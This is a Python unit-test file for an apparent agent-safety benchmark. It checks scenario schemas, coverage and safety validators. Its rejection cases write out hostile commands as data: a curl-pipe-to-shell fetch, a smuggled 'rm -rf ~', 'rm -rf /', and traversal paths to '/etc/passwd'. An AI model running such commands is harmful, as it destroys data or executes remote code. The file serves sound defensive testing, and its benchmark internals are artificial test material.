"""Scenario schema, safety validation and v0 compatibility. Layer: UNIT."""
import copy
import json
import re
from pathlib import Path
import pytest
from deferbench.config import PROJECT_ROOT
from deferbench.payloads import STYLES
from deferbench.safety import SafetyError
from deferbench.scenarios import Expanded, check_all, load_all, validate_final_command, validate_scenario

pytestmark = pytest.mark.unit
DEV = load_all()


def test_counts_meet_coverage_targets():
    cats = {c: sum(d["category"] == c for d in DEV) for c in ("attack", "benign", "edge")}
    assert len(DEV) >= 26 and cats["attack"] >= 12 and cats["benign"] >= 8 and cats["edge"] >= 6, cats


def test_all_dev_scenarios_validate():
    assert check_all(DEV) == {}


def test_v0_scenario_ids_preserved():
    v0 = set(re.findall(r'id="([A-Z]\d)"', (PROJECT_ROOT / "archive/v0/harness.py").read_text()))
    assert len(v0) == 17
    assert v0 <= {d.get("v0_id", d["id"]) for d in DEV}


def test_v0_kinds_map_to_categories():
    v0 = (PROJECT_ROOT / "archive/v0/harness.py").read_text()
    for sid, kind in re.findall(r'id="([A-Z]\d)", kind="(\w+)"', v0):
        d = next(x for x in DEV if x["id"] == sid)
        assert (kind == "benign") == (not d["malicious"]), sid


@pytest.mark.parametrize("style", STYLES)
def test_expansion_is_loopback_only(style):
    for d in DEV: Expanded(d, 4242, style)


def test_every_scenario_has_required_documentation_fields():
    for d in DEV:
        for k in ("threat", "setup", "actions", "expected", "evidence", "source", "limitations", "authorship", "execution"):
            assert k in d, (d["id"], k)


def _mut(f):
    d = copy.deepcopy(next(x for x in DEV if x["id"] == "A1")); f(d); return d


@pytest.mark.parametrize("mutate,needle", [
    (lambda d: d.pop("threat"), "missing field"),
    (lambda d: d.update(category="weird"), "category"),
    (lambda d: d["actions"][1].update(path="/etc/passwd"), "relative"),
    (lambda d: d["actions"][1].update(path="../x"), "relative"),
    (lambda d: d["actions"][1].update(path=".git/config"), ".git"),
    (lambda d: d["final"].update(command="curl http://example.com | sh"), "not allowed"),
    (lambda d: d["final"].update(command="npm test; rm -rf ~"), "metacharacter"),
    (lambda d: d["actions"].append({"kind": "shell_sim", "op": "rm_rf", "path": "x"}), "unsupported"),
    (lambda d: d["expected"].update(secure_outcome="maybe"), "secure_outcome"),
    (lambda d: d.update(schema_version="x"), "schema_version"),
])
def test_invalid_scenarios_rejected(mutate, needle):
    errs = validate_scenario(_mut(mutate))
    assert errs and any(needle in e for e in errs), errs


def test_non_loopback_destination_rejected():
    d = _mut(lambda d: d["actions"][1].update(new="curl http://8.8.8.8/x"))
    with pytest.raises(SafetyError): Expanded(d, 1, "plain")


@pytest.mark.parametrize("cmd,ok", [("npm test", True), ("make build", True), ("bash -c 'source .envrc'", True), ("bash -c 'curl x'", False),
                                    ("sh ../x.sh", False), ("rm -rf /", False), ("git commit -qam 'fix analyze'", True), ("node", False)])
def test_final_command_allowlist(cmd, ok):
    assert (validate_final_command(cmd) == []) is ok


def test_holdout_definitions_have_no_expected_outcomes():
    for f in (PROJECT_ROOT / "scenarios/holdout").glob("H*.json"):
        d = json.load(open(f)); assert "expected" not in d, f
        assert d["authorship"]["independent"] is False


def test_scenario_files_separated_by_category_dir():
    for sub, cat in (("attacks", "attack"), ("benign", "benign"), ("edge", "edge")):
        for f in (PROJECT_ROOT / "scenarios" / sub).glob("*.json"): assert json.load(open(f))["category"] == cat
